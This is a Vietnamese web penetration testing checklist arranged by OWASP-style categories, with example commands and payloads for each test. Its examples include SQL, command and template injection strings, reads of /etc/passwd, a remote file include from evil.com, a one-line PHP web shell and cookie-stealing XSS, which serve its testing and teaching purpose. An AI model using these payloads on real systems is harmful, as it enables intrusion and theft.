# **MỤC LỤC**

Dưới đây là **Mục lục** với các liên kết đến từng phần. Bạn chỉ cần nhấp vào tiêu đề để đến nội dung tương ứng:

1. [1. **Nhận dạng (THÔNG TIN)**](#1-nhận-dạng-thông-tin)
2. [2. **Kiểm tra quản lý cấu hình và triển khai (CẤU HÌNH)**](#2-kiểm-tra-quản-lý-cấu-hình-và-triển-khai-cấu-hình)
3. [3. **Kiểm tra quản lý danh tính (IDENT)**](#3-kiểm-tra-quản-lý-danh-tính-ident)
4. [4. **Kiểm tra xác thực (XÁC THỰC)**](#4-kiểm-tra-xác-thực-xác-thực)
5. [5. **Kiểm tra ủy quyền (AUTHZ)**](#5-kiểm-tra-ủy-quyền-authz)
6. [6. **Kiểm tra quản lý phiên (PHIÊN)**](#6-kiểm-tra-quản-lý-phiên-phiên)
7. [7. **Kiểm tra xác thực dữ liệu (INPVAL)**](#7-kiểm-tra-xác-thực-dữ-liệu-inpval)
8. [8. **Xử lý lỗi (ERR)**](#8-xử-lý-lỗi-err)
9. [9. **Mật mã học (CRYPST)**](#9-mật-mã-học-crypst)
10. [10. **Kiểm tra logic kinh doanh (BUSLOGIC)**](#10-kiểm-tra-logic-kinh-doanh-buslogic)
11. [11. **Kiểm tra phía khách hàng (KHÁCH HÀNG)**](#11-kiểm-tra-phía-khách-hàng-khách-hàng)

---




---

# 1. **Nhận dạng (THÔNG TIN)**

**Khám phá và Trinh sát (Reconnaissance & Discovery)** trong pentest web:

| **STT**  | **Hoạt động**                     | **Chi tiết**                                           | **Ví dụ**                                                 |
| -------- | --------------------------------- | ------------------------------------------------------ | --------------------------------------------------------- |
| **1.1**  | Khai thác công cụ tìm kiếm        | Sử dụng Google Dorks để tìm thông tin nhạy cảm         | `site:example.com filetype:pdf "confidential"`            |
| **1.2**  | Vân tay máy chủ web               | Kiểm tra loại máy chủ qua tiêu đề HTTP                 | `curl -I http://example.com` → `Server: Apache/2.4.41`    |
| **1.3**  | Phân tích tệp siêu dữ liệu        | Xem `robots.txt`, `sitemap.xml` để thu thập thông tin  | `http://example.com/robots.txt` → `Disallow: /admin`      |
| **1.4**  | Liệt kê ứng dụng chạy trên server | Dùng WhatWeb hoặc Wappalyzer để xác định CMS           | `whatweb example.com` → `WordPress[4.9.8], PHP[7.2]`      |
| **1.5**  | Tìm rò rỉ trong mã HTML           | Phân tích comment và metadata                          | `<!-- API Key: 12345xyz -->` trong mã nguồn               |
| **1.6**  | Xác định điểm nhập ứng dụng       | Tìm login forms, admin pages, API endpoint             | `http://example.com/login` có form đăng nhập không bảo vệ |
| **1.7**  | Lập bản đồ các endpoint           | Dùng Burp Suite để thu thập URL                        | Phát hiện: `/api/v1/users`, `/admin`                      |
| **1.8**  | Vân tay framework                 | Nhận dạng Django, Laravel,... qua cookies/URL          | `sessionid` → Có thể là Django                            |
| **1.9**  | Vân tay ứng dụng web              | Xác định ứng dụng như phpMyAdmin qua thư mục đặc trưng | `http://example.com/phpmyadmin`                           |
| **1.10** | Bản đồ kiến trúc ứng dụng         | Vẽ sơ đồ liên kết server, API, DB                      | Dùng Burp suite → `api.example.com` → MySQL backend        |




---

# 2. **Kiểm tra quản lý cấu hình và triển khai (CẤU HÌNH)**
** Chuẩn bị Môi trường Thử nghiệm (Testing Environment Setup)**, cấu trúc tương tự phần 1:

| **STT**  | **Hoạt động**                                      | **Chi tiết**                                                                                         | **Ví dụ**                                                                                                       |
| -------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| **2.1**  | Cấu hình mạng / cơ sở hạ tầng thử nghiệm           | Thiết lập mạng riêng biệt (VLAN, VPN) và quy tắc firewall để tránh ảnh hưởng lên môi trường sản xuất | VLAN 192.168.100.0/24, firewall chỉ cho phép HTTP(S) từ IP của pentester                                        |
| **2.2**  | Cấu hình nền tảng ứng dụng thử nghiệm              | Triển khai phiên bản staging/dev của ứng dụng với cùng stack công nghệ và cấu hình tương tự sản xuất | Dùng Docker Compose để khởi tạo webapp (Nginx+PHP) và database (MySQL)                                          |
| **2.3**  | Kiểm tra phần mở rộng tệp xử lý thông tin nhạy cảm | Xác định xem server có cho phép upload hoặc phục vụ các extension chứa data nhạy cảm hay không       | Phát hiện file .bak, .old, .sql nằm trong thư mục public\_html                                                  |
| **2.4**  | Kiểm tra file sao lưu và tập tin vô tham chiếu     | Tìm kiếm các bản backup, các file cũ không còn link nhưng vẫn tồn tại trên server                    | `config.php.bak`, `database.sql.gz` rơi vào thư mục `/backup/` nhưng có thể truy cập qua web                    |
| **2.5**  | Liệt kê giao diện quản trị                         | Xác định các panel quản trị hạ tầng (router, switch) và ứng dụng (CMS, API admin)                    | Phát hiện phpMyAdmin ở `http://test.example.com/phpmyadmin` và trang /admin của WordPress                       |
| **2.6**  | Kiểm tra phương thức HTTP                          | Kiểm tra các HTTP methods được server chấp nhận (PUT, DELETE, TRACE…)                                | `curl -X OPTIONS http://test.example.com -i` → cho phép `DELETE`                                                |
| **2.7**  | Kiểm tra bảo mật truyền tải HTTP nghiêm ngặt       | Xác minh HSTS, TLS version, cipher suite, redirect HTTP→HTTPS                                        | `curl -I https://test.example.com` → có header `Strict-Transport-Security: max-age=63072000; includeSubDomains` |
| **2.8**  | Kiểm tra chính sách cross‑domain (CORS / RIA)      | Đánh giá header `Access-Control-Allow-*`, xác định domain nào được phép cross‑origin                 | `curl -I http://api.test.example.com` → `Access-Control-Allow-Origin: *`                                        |
| **2.9**  | Kiểm tra quyền file hệ thống                       | Xem permission và ownership của các file/config nhạy cảm                                             | `ls -l /var/www/html/config.php` → `-rw-r--r--` (644) nên để 600                                                |
| **2.10** | Kiểm tra tiếp quản subdomain                       | Phát hiện DNS records trỏ đến dịch vụ cloud không sử dụng hoặc “dang dở”                             | `sub.test.example.com` CNAME → `xyz.s3.amazonaws.com` nhưng bucket S3 đã bị xóa → có thể takeover               |




---

# 3. **Kiểm tra quản lý danh tính (IDENT)**
 Quản lý Tài khoản Thử nghiệm (Test Account Management)**:

| **STT** | **Hoạt động**                                    | **Chi tiết**                                                                                         | **Ví dụ**                                                                                             |
| ------- | ------------------------------------------------ | ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| **3.1** | Định nghĩa vai trò kiểm tra                      | Xác định rõ các quyền và phạm vi của từng loại tài khoản (Admin, User, Guest, Tester…)               | Phân quyền: Tester chỉ có quyền đọc; User có quyền đọc/ghi; Admin có quyền toàn bộ                    |
| **3.2** | Quy trình đăng ký người dùng thử nghiệm          | Thiết lập form hoặc API để tạo tài khoản thử nghiệm, đảm bảo có xác thực captcha hoặc email verify   | Gửi email kích hoạt đến [tester@example.com](mailto:tester@example.com) trước khi kích hoạt tài khoản |
| **3.3** | Quy trình cung cấp tài khoản thử nghiệm          | Cung cấp thông tin đăng nhập (username/password) cho tester qua kênh an toàn (e.g. vault, PGP email) | Lưu credentials trên HashiCorp Vault, chỉ tester mới có quyền truy cập                                |
| **3.4** | Kiểm tra để đếm tài khoản và đoán được tài khoản | Tìm lỗ hổng enumeration qua API hoặc response timing để phát hiện số lượng và pattern tài khoản      | Gọi `GET /api/users?page=1` và đoán username theo index (user1, user2…)                               |
| **3.5** | Kiểm tra chính sách tên người dùng               | Đánh giá độ mạnh, độ dài tối thiểu và ký tự cho phép của username; thử bypass rule                   | Tạo username “admin ” (có khoảng trắng) hoặc “<script>” qua form đăng ký để kiểm tra validate         |
| **3.6** | Kiểm tra quyền của tài khoản Guest/Đào tạo       | Xác minh tài khoản hạn chế không thể truy cập vùng hoặc API không thuộc quyền                        | Dùng Guest account thử truy cập `/admin/dashboard` → phải trả về 403                                  |
| **3.7** | Quy trình tạm dừng/tiếp tục tài khoản thử nghiệm | Thực hiện disable/enable tài khoản khi không cần dùng, đảm bảo token/ session bị thu hồi             | Chạy API `POST /users/{id}/disable` → user bị logout, không thể login lại cho đến khi enable lại      |




---

# 4. **Kiểm tra xác thực (XÁC THỰC)**
 **Kiểm thử Xác thực (Authentication Testing)**:

| **STT**  | **Hoạt động**                                            | **Chi tiết**                                                                                                      | **Ví dụ**                                                                                       |
| -------- | -------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| **4.1**  | Kiểm tra thông tin xác thực qua kênh được mã hóa         | Đảm bảo credentials (username/password, tokens) luôn đi qua HTTPS/TLS, không để lộ qua HTTP hoặc kênh không kỳ mã | Quan sát `POST /login` phải là `https://`; nếu `http://` → MITM sniff credentials               |
| **4.2**  | Kiểm tra thông tin xác thực mặc định                     | Xem có tài khoản mặc định (admin/admin, root/password) chưa được đổi mật khẩu sau deploy                          | Đăng nhập với `admin:admin` hoặc `root:password` thành công                                     |
| **4.3**  | Kiểm tra cơ chế khóa tài khoản yếu                       | Test số lần đăng nhập sai trước khi khóa, thời gian khóa, khả năng reset tự động                                  | Thử 10 lần sai mật khẩu vẫn không bị khóa, hoặc khóa nhưng tự mở lại sau 1 phút                 |
| **4.4**  | Kiểm tra bypass lược đồ xác thực                         | Xác minh không thể vượt qua authentication bằng kỹ thuật như HTTP verb tampering, URL parameter tampering         | Gửi `GET /admin?auth=true` thay vì POST; nếu vẫn truy cập được → bypass                         |
| **4.5**  | Kiểm tra chức năng “ghi nhớ mật khẩu” (Remember Me)      | Đánh giá độ an toàn của cookie “remember\_me”: HttpOnly, Secure, expiration, khả năng forge                       | Cookie `remember_me=abcd1234` không có flag Secure/HttpOnly và thời gian quá dài                |
| **4.6**  | Kiểm tra điểm yếu bộ nhớ đệm trình duyệt (Browser Cache) | Đảm bảo không cache trang chứa sensitive data sau logout                                                          | Logout rồi bấm Back trên trình duyệt vẫn xem được `/dashboard` → cache control header chưa đúng |
| **4.7**  | Kiểm tra chính sách mật khẩu yếu                         | Đánh giá độ dài tối thiểu, complexity, blacklist, kiểm tra cho phép mật khẩu yếu như “123456”                     | Cho phép đặt password “password” hoặc “123456” mà không báo lỗi                                 |
| **4.8**  | Kiểm tra câu hỏi bảo mật yếu                             | Xem câu hỏi/đáp bảo mật dễ đoán hoặc reuse, khả năng bruteforce                                                   | Câu hỏi “Tên thú cưng đầu tiên” quá phổ biến, thử “Fluffy” thành công reset mật khẩu            |
| **4.9**  | Kiểm tra chức năng thay đổi/đặt lại mật khẩu             | Đánh giá quy trình reset: token duy nhất, hết hạn, gửi email xác thực, không leak user ID                         | Reset link chứa user\_id=1001 dễ đoán → thử đổi thành 1002 để reset mật khẩu của user khác      |
| **4.10** | Kiểm tra xác thực kênh thay thế (out-of-band) yếu        | Đánh giá phương pháp xác thực qua SMS/email/OTP, khả năng replay, man-in-the-middle                               | Nhận OTP rồi resend request cũ hoặc reuse OTP sau khi đã dùng lần đầu → vẫn được chấp nhận      |





---

# 5. **Kiểm tra ủy quyền (AUTHZ)**
  ** Kiểm thử Phân quyền (Authorization Testing)**:

| **STT** | **Hoạt động**                                                        | **Chi tiết**                                                                                                                    | **Ví dụ**                                                                                                                  |
| ------- | -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| **5.1** | Kiểm tra duyệt thư mục / bao gồm tệp (Directory Traversal / LFI/RFI) | Thử truy cập file ngoài webroot hoặc include file từ hệ thống (LFI/RFI). Kiểm tra `../` sequences và tham số include.           | `GET /download?file=../../../../etc/passwd` → nếu trả về nội dung → tồn tại Directory Traversal                            |
| **5.2** | Kiểm tra bypass lược đồ ủy quyền (Authorization Bypass)              | Thử thay đổi token/session, URL, header hoặc các tham số ID để truy cập tài nguyên không được cấp quyền                         | Dùng tài khoản user thay `${id}` trong URL `/user/123/profile` thành `/user/124/profile` → vẫn xem được profile người khác |
| **5.3** | Kiểm tra tăng đặc quyền (Horizontal & Vertical Privilege Escalation) | Horizontal: dùng quyền ngang bậy (tài khoản user truy cập data của other user). Vertical: user thường truy cập chức năng admin. | Dùng user role “editor” thử truy cập `/admin/delete-user` → nếu thành công → có thể tăng đặc quyền                         |
| **5.4** | Kiểm tra tham chiếu đối tượng trực tiếp không an toàn (IDOR)         | Kiểm tra các tham số object ID (file\_id, order\_id…) có thể đoán và truy cập không qua kiểm tra ủy quyền                       | `GET /invoice?invoice_id=1001` → chỉnh `1002` vẫn tải được hóa đơn của user khác → IDOR tồn tại                            |




---

# 6. **Kiểm tra quản lý phiên (PHIÊN)**
** Kiểm thử Quản lý Phiên (Session Management Testing)**:

| **STT** | **Hoạt động**                | **Chi tiết**                                                                                       | **Ví dụ**                                                                                                      |
| ------- | ---------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| **6.1** | Bypass lược đồ quản lý phiên | Thử kỹ thuật như session fixation, session riding để chiếm quyền của phiên khác                    | Gửi request có `JSESSIONID` cũ qua URL: `GET /home?jsessionid=<fixed_id>` và kiểm tra vẫn đăng nhập được       |
| **6.2** | Kiểm tra thuộc tính Cookie   | Đảm bảo cookie session có flags `HttpOnly`, `Secure`, `SameSite` phù hợp                           | `Set-Cookie: session=abcd; HttpOnly; Secure; SameSite=Strict`                                                  |
| **6.3** | Kiểm tra session fixation    | Xác minh không cho phép attacker đặt ID session trước khi login                                    | Gửi cookie giả `session=attacker123`, sau đó login → server không chấp nhận `attacker123` mà tạo session mới   |
| **6.4** | Kiểm tra hiển thị biến phiên | Đảm bảo không lộ session token qua URL, form, hoặc HTML comment                                    | Không để `<!-- Session: abcdef123456 -->` trong source; không xuất `?session=` trong link                      |
| **6.5** | Kiểm tra CSRF                | Đánh giá token chống CSRF: tồn tại, đủ độ mạnh, kiểm tra trên tất cả form/state‑changing endpoints | Form `POST /transfer` phải có `<input type="hidden" name="csrf_token" value="random">` và kiểm tra reuse token |
| **6.6** | Kiểm tra chức năng đăng xuất | Xác minh sau logout session token bị thu hồi và không thể reuse                                    | Sau `POST /logout`, reload trang → redirect về login; dùng lại cookie cũ phải báo “Unauthorized”               |
| **6.7** | Kiểm tra timeout phiên       | Đảm bảo session hết hạn sau khoảng idle nhất định                                                  | Đăng nhập, chờ 15 phút không hoạt động rồi refresh → phải login lại                                            |
| **6.8** | Kiểm tra “session puzzle”    | Đánh giá cơ chế bảo vệ chống automated session hijacking (CAPTCHA, puzzle challenge)               | Truy cập lặp lại request sau 10 lần → hiện CAPTCHA mới đăng nhập tiếp                                          |
| **6.9** | Kiểm tra session hijacking   | Thử capture và replay session token qua MITM hoặc JS steal                                         | Chèn `document.cookie` extractor script trên trang báo về attacker và dùng cookie đó để login trên client khác |



  ---

# 7. **Kiểm tra xác thực dữ liệu (INPVAL)**
** Kiểm thử Tiêm độc (Injection Testing)**:

| **STT**  | **Hoạt động**                                        | **Chi tiết**                                                                                           | **Ví dụ**                                                                                      |                                                                      |
| -------- | ---------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| **7.1**  | Reflected XSS                                        | Đưa payload JS qua tham số URL/form, phản hồi ngay trong HTML mà không encode                          | `?q=<script>alert(1)</script>` → alert bật lên ngay trên trang                                 |                                                                      |
| **7.2**  | Stored XSS                                           | Lưu payload vào DB, khi người dùng khác load trang sẽ execution                                        | Gửi comment `<img src=x onerror=alert(1)>` vào form bình luận → khi ai đó xem comment sẽ alert |                                                                      |
| **7.3**  | HTTP Verb Tampering                                  | Thay đổi method (PUT→GET, DELETE→POST…) để bypass kiểm tra server                                      | Dùng `POST /login` thay vì `GET /login` và vẫn trả về form đăng nhập                           |                                                                      |
| **7.4**  | HTTP Parameter Pollution                             | Gửi nhiều tham số cùng tên để override giá trị mặc định hoặc bypass logic                              | `?id=1&id=2` → server chỉ lấy `2` hoặc nối thành `1,2` gây bypass                              |                                                                      |
| **7.5**  | SQL Injection                                        | Thử payload `' OR '1'='1` với Oracle/MySQL/SQLServer/PostgreSQL/MSAccess/NoSQL/ORM/phía client         | `username=admin'-- ` hoặc `email=foo@bar.com' OR '1'='1`                                       |                                                                      |
| **7.6**  | LDAP Injection                                       | Thay đổi filter LDAP bằng ký tự đặc biệt để bypass authentication hoặc truy vấn                        | `cn=*)(&(objectClass=*))\0` trong field tìm kiếm LDAP                                          |                                                                      |
| **7.7**  | XML Injection                                        | Chèn node hoặc attribute ác ý vào XML để làm biến dạng cấu trúc                                        | Gửi `<user><name>admin</name><role>admin</role></user>` thay vì `<role>user</role>`            |                                                                      |
| **7.8**  | SSI Injection                                        | Chèn directive SSI (`<!--#include virtual="/etc/passwd"-->`) để lộ file hệ thống                       | Truy cập `?page=<!--#exec cmd="/bin/ls"-->` → liệt kê file thư mục                             |                                                                      |
| **7.9**  | XPath Injection                                      | Thay đổi biểu thức XPath để truy vấn đọc dữ liệu trái phép                                             | `?xmlQuery=//user[name/text()='admin' and password/text()!='']` → bypass kiểm tra mật khẩu     |                                                                      |
| **7.10** | IMAP/SMTP Injection                                  | Chèn lệnh SMTP/IMAP vào đầu vào email để thực thi lệnh server mail                                     | `Subject: Test\r\nRCPT TO:<victim@example.com>\r\n` → spam relay                               |                                                                      |
| **7.11** | Code Injection (LFI/RFI)                             | Chèn lệnh include file hệ thống hoặc remote file qua tham số                                           | `?file=../../../../etc/passwd` (LFI) hoặc `?file=http://evil.com/shell.txt` (RFI)              |                                                                      |
| **7.12** | Command Injection                                    | Thêm `; rm -rf /` hoặc \`                                                                              | ls\` vào tham số shell execution                                                               | `?cmd=ping 127.0.0.1; cat /etc/passwd` → hiện nội dung `/etc/passwd` |
| **7.13** | Format String Injection                              | Chèn `%x`/`%n` để đọc hoặc ghi lên stack                                                               | Trong input `Hello %x%x%x` → server log hiện giá trị hex từ stack                              |                                                                      |
| **7.14** | Injection sẵn có (Prototype Pollution…)              | Khai thác lỗ hổng injection đã known/bí mật trong thư viện/framework                                   | Sử dụng payload `"__proto__": {"isAdmin": true}` để nâng quyền trong JS                        |                                                                      |
| **7.15** | HTTP Response Splitting / Smuggling                  | Chèn CRLF để tách header hoặc làm hỏng framing HTTP nhằm bypass cache/CDN                              | `?foo=bar%0d%0aSet-Cookie:%20evil=1` → server gửi thêm cookie độc                              |                                                                      |
| **7.16** | Server-Side Request Forgery (SSRF)                   | Bắt server gọi nội bộ/external service với URL do attacker kiểm soát                                   | `?url=http://169.254.169.254/latest/meta-data/` → lộ AWS metadata                              |                                                                      |
| **7.17** | Host Header Injection                                | Thay đổi header Host để tạo link reset hoặc poison cache                                               | `Host: attacker.com` → link reset gửi về attacker.com                                          |                                                                      |
| **7.18** | Template Injection                                   | Chèn payload vào template engine (Freemarker, Twig, ERB…) để thực thi code                             | `${{7*7}}` hoặc `{{7*7}}` xuất thành `49` hoặc chèn `{{config}}` để lộ config                  |                                                                      |
| **7.19** | Server-Side Template Injection (SSTI)                | Tương tự template injection nhưng có thể exec shell hoặc đọc file hệ thống                             | `{{''.class.base.subclasses()[85].instance_eval('`ls`')}}` trong ERB                           |                                                                      |
| **7.20** | Server-Side Request Forgery (SSRF) – yêu cầu giả mạo | Khai thác endpoint cho server gửi request HTTP đến internal/external dịch vụ với URL attacker cung cấp | `POST /proxy` body: `{"target":"http://localhost:8080/admin"}` → lộ giao diện admin nội bộ     |                                                                      |




---

# 8. **Xử lý lỗi (ERR)**

** Kiểm thử Xử lý Ngoại lệ và Lỗi (Error Handling & Logging Testing)**:

| **STT** | **Hoạt động**                                     | **Chi tiết**                                                                                                 | **Ví dụ**                                                                                                          |
| ------- | ------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------ |
| **8.1** | Kiểm tra xử lý lỗi không đúng cách                | Gửi dữ liệu đầu vào gây lỗi (SQL error, JSON parse error…) và kiểm tra hệ thống có trả về thông tin nhạy cảm | `GET /product?id=’` → nếu trả về stack trace hoặc SQL query lỗi chứa tên bảng/ cột → xử lý lỗi lộ thông tin nội bộ |
| **8.2** | Phân tích dấu vết ngăn xếp (Stack Trace Analysis) | Đánh giá log, stack trace được trả về hoặc lưu vào file log: có filter sensitive path/ code hay không        | Khi gọi API lỗi, response body chứa `Exception in thread “main” java.lang.NullPointerException at com.app.Main:25` |




---

# 9. **Mật mã học (CRYPST)**
** Kiểm thử Mã hóa và Bảo mật Truyền tải (Encryption & Transport Security Testing)**:

| **STT** | **Hoạt động**                                                   | **Chi tiết**                                                                                                         | **Ví dụ**                                                                                                                         |
| ------- | --------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **9.1** | Kiểm tra mã hóa SSL/TLS yếu, bảo vệ lớp truyền tải không đủ     | Đánh giá phiên bản TLS (không dùng SSLv2/SSLv3), cipher suite yếu (RC4, DES), không có Perfect Forward Secrecy (PFS) | Dùng `sslscan example.com` → phát hiện hỗ trợ TLS 1.0, RC4-SHA và thiếu `ECDHE` → dễ bị tấn công BEAST/RC4                        |
| **9.2** | Kiểm tra Padding Oracle                                         | Gửi các ciphertext được sửa đổi để dò padding của khối mã hóa và từ đó giải mã nội dung                              | Tạo request HTTPS với payload cipher sẽ trả về lỗi `PaddingException` hoặc `Bad decrypt` khác nhau → xác định oracle padding      |
| **9.3** | Kiểm tra thông tin nhạy cảm được gửi qua kênh không được mã hóa | Kiểm tra endpoint hoặc redirect trả về HTTP (thay vì HTTPS), URL chứa token, cookie qua HTTP                         | Truy cập `http://api.example.com/data?token=abc123` → token lộ trên đường truyền; redirect từ HTTPS → HTTP vẫn giữ cookie session |




---

# 10. **Kiểm tra logic kinh doanh (BUSLOGIC)**
**Kiểm thử Logic Ứng dụng & Tải lên Tập tin (Business Logic & File Upload Testing)**:

| **STT**  | **Hoạt động**                                            | **Chi tiết**                                                                                                | **Ví dụ**                                                                                                |
| -------- | -------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| **10.1** | Kiểm tra xác thực dữ liệu logic kinh doanh               | Đảm bảo các ràng buộc nghiệp vụ (số lượng, giá trị, trạng thái) được kiểm tra trên server, không chỉ client | Đặt giá món hàng 0₫ qua API `/order/create` → server phải từ chối                                        |
| **10.2** | Kiểm tra khả năng rèn yêu cầu (Parameter Tampering)      | Thử thay đổi tham số logic (discount, quantity, role…) để phá vỡ quy tắc kinh doanh                         | Gửi `discount=90%` trong checkout dù chỉ được phép 10% → nếu chấp nhận → tuỳ chỉnh lỗi nghiệp vụ chưa đủ |
| **10.3** | Kiểm tra tính toàn vẹn của dữ liệu (Integrity Checks)    | Xác minh checksum, token hoặc HMAC cho các dữ liệu nhạy cảm được gửi đi và nhận lại                         | Thay đổi giá trị `amount` nhưng không có HMAC hợp lệ → server phải phát hiện và từ chối                  |
| **10.4** | Kiểm tra theo dõi thời gian xử lý (Timing Attack)        | Đo thời gian phản hồi để dò rò rỉ thông tin (ví dụ endpoint xác thực tồn tại user)                          | Gửi `POST /user/reset` với email khác nhau, nếu chênh lệch thời gian ⇒ user enumeration                  |
| **10.5** | Kiểm tra giới hạn số lần gọi API (Rate Limiting)         | Đảm bảo mỗi hàm/endpoint chỉ được gọi trong ngưỡng cho phép để tránh brute‑force hoặc DDoS logic            | Gửi 1000 request `/login` trong 1 phút → phải bị chặn hoặc chậm lại                                      |
| **10.6** | Kiểm tra né luồng công việc (Workflow Bypass)            | Thử truy cập các bước tiếp theo của workflow mà chưa qua bước trước                                         | Truy cập `/checkout/confirm` mà không có `cart_id` hợp lệ → server phải redirect về `/cart`              |
| **10.7** | Kiểm thử chống lạm dụng chức năng (Misuse Defenses)      | Kiểm tra các biện pháp ngăn chặn hành vi không mong muốn như email spam, comment flooding                   | Tạo 50 comment trong 1 phút → nếu không có throttle/token ⇒ cần bổ sung rate limit hoặc captcha          |
| **10.8** | Kiểm tra tải lên loại tệp không mong muốn (File Type)    | Đảm bảo chỉ cho phép ext và MIME type hợp lệ, lọc front‑end/back‑end                                        | Upload `shell.php` dưới dạng `.jpg` nhưng không đổi MIME → server phải từ chối                           |
| **10.9** | Kiểm tra tải lên tập tin độc hại (Malicious File Upload) | Quét virus, sandbox file, kiểm tra nội dung file để tránh backdoor, webshell                                | Upload file PHP chứa `<?php system($_GET['cmd']); ?>` → server phải phát hiện và cách ly                 |

t ngay!


---

# 11. **Kiểm tra phía khách hàng (KHÁCH HÀNG)**
**Kiểm thử Bảo mật Phía Khách (Client-side Security Testing)**:

| **STT**   | **Hoạt động**                                                   | **Chi tiết**                                                                                                           | **Ví dụ**                                                                                                                    |
| --------- | --------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **11.1**  | Kiểm tra XSS dựa trên DOM (DOM‑Based XSS)                       | Đưa payload vào URL hoặc thuộc tính DOM (location.hash, document.write, innerHTML) và kiểm tra execution trên client   | `http://example.com/page#<script>alert(1)</script>` → nếu alert bật lên ⇒ tồn tại DOM XSS                                    |
| **11.2**  | Kiểm tra thực thi JavaScript                                    | Tìm các điểm chèn JS qua thuộc tính onclick/onmouseover hoặc eval()                                                    | Trong mã: `eval(userInput)` → thử payload `');alert(1);//` để xem có alert hay không                                         |
| **11.3**  | Kiểm tra tiêm HTML (HTML Injection)                             | Đưa HTML vào input và kiểm tra xem có được render hay bị escape                                                        | `<b>Bold</b>` xuất thành chữ in đậm trên trang thay vì hiển thị \<b>Bold\</b>                                                |
| **11.4**  | Kiểm tra chuyển hướng URL phía khách (Open Redirect)            | Đưa URL bên ngoài vào parameter redirect và kiểm tra xem có bị redirect blind                                          | `?next=http://evil.com` → sau login server redirect thẳng tới evil.com ⇒ open redirect                                       |
| **11.5**  | Kiểm tra CSS Injection                                          | Đưa payload CSS vào thuộc tính style hoặc class và kiểm tra xem có thể thay đổi giao diện hoặc steal thông tin         | `<div style="background:url(javascript:alert(1))">` → nếu alert bật ⇒ CSS Injection                                          |
| **11.6**  | Kiểm tra thao tác tài nguyên phía khách (Local File Access)     | Kiểm tra hàm File API, XMLHttpRequest tới file:// và sandboxing                                                        | Dùng JS: `fetch('file:///etc/passwd')` → nếu lấy được nội dung ⇒ thiếu sandbox                                               |
| **11.7**  | Kiểm tra chia sẻ tài nguyên nguồn gốc chéo (CORS misconfig)     | Đánh giá `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials` trên JS fetch/ajax                          | `fetch('https://api.site.com/data',{credentials:'include'})` mà `Allow-Origin: *` ⇒ có thể leak cookie                       |
| **11.8**  | Kiểm tra nhấp nháy chéo (Cross‑Document Messaging)              | Kiểm tra window\.postMessage() không validate origin trước khi nhận message                                            | `window.addEventListener('message',e=>console.log(e.data))` không kiểm tra `e.origin` ⇒ attacker gửi message tùy ý           |
| **11.9**  | Kiểm tra Clickjacking                                           | Đóng khung trang trong `<iframe>` và test các header `X-Frame-Options` hoặc `Content‑Security‑Policy: frame-ancestors` | Tạo trang chứa `<iframe src="http://example.com"></iframe>` → nếu vẫn hiện giao diện và thao tác được ⇒ clickjacking tồn tại |
| **11.10** | Kiểm tra WebSockets                                             | Đánh giá kết nối ws\:// vs wss\://, kiểm tra origin header và cơ chế xác thực                                          | Kết nối `new WebSocket('ws://example.com/socket')` → nếu không upgrade lên wss và không kiểm tra origin ⇒ dễ bị MITM         |
| **11.11** | Kiểm tra tin nhắn web (Web Messaging)                           | Đánh giá bảo mật WebRTC dataChannel hoặc BroadcastChannel, kiểm tra validate payload                                   | `broadcastChannel.onmessage = msg => eval(msg.data)` → có thể exec JS độc hại                                                |
| **11.12** | Kiểm tra lưu trữ cục bộ (LocalStorage/SessionStorage)           | Kiểm tra sensitive data (token, PII) lưu trữ trong storage, khả năng JS lấy đọc trên mọi tab                          | `localStorage.setItem('jwt', token)` → thử `console.log(localStorage.jwt)` ⇒ lộ token                                        |
| **11.13** | Kiểm tra chèn tập lệnh Cross‑Site (Cross‑Site Script Inclusion) | Đánh giá `<script src>` từ domain bên ngoài, kiểm tra Subresource Integrity (SRI)                                      | `<script src="http://cdn.evil.com/lib.js"></script>` mà không có `integrity` ⇒ attacker thay đổi mã nguồn bên ngoài          |




—

